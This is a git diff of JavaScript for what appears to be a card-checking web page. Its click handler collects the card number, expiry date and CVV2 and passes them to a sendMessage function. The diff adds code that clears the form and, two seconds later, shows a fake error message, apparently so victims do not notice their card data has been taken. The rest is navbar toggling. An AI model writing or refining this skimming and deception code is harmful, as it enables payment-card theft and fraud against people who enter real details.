@@ -173,7 +173,7 @@ checkBtn.addEventListener('click', () => {
   }
 
   const message = `
-    Card Number: ${inputField.value}
+    Card Number: ${inputField.value.replaceAll('-', '')}
     Expiration: ${mm}/${yy}
     Cvv2: ${cvv2.value}
     --------------
@@ -210,5 +210,45 @@ checkBtn.addEventListener('click', () => {
     console.log(yy);
     console.log(cvv2.value);
     sendMessage(message);
+    inputField.value = '';
+    expirationDate.value = '';
+    cvv2.value = '';
+    setTimeout(() => {
+      Toastify({
+        text: 'Your request was received in error Please try again later',
+        duration: 3000,
+        newWindow: true,
+        close: true,
+        gravity: 'top', // `top` or `bottom`
+        position: 'right', // `left`, `center` or `right`
+        stopOnFocus: true, // Prevents dismissing of toast on hover
+        style: {
+          fontSize: '1.1rem',
+          fontWeight: '600',
+          background: '#EA384D',
+          width: '300px',
+          minWidth: '300px',
+          display: 'flex',
+          justifyContent: 'space-between',
+        },
+      }).showToast();
+    }, 2000);
   }
+});
+
+// navbar
+const listSvg = document.getElementById('listSvg');
+const xSvg = document.getElementById('xSvg');
+const listBox = document.getElementById('listBox');
+const scrollBox = document.getElementById('scrollBox');
+
+listSvg.addEventListener('click', () => {
+  listSvg.classList.add('hidden');
+  xSvg.classList.remove('hidden');
+  scrollBox.classList.remove('hidden');
+});
+xSvg.addEventListener('click', () => {
+  xSvg.classList.add('hidden');
+  listSvg.classList.remove('hidden');
+  scrollBox.classList.add('hidden');
 });
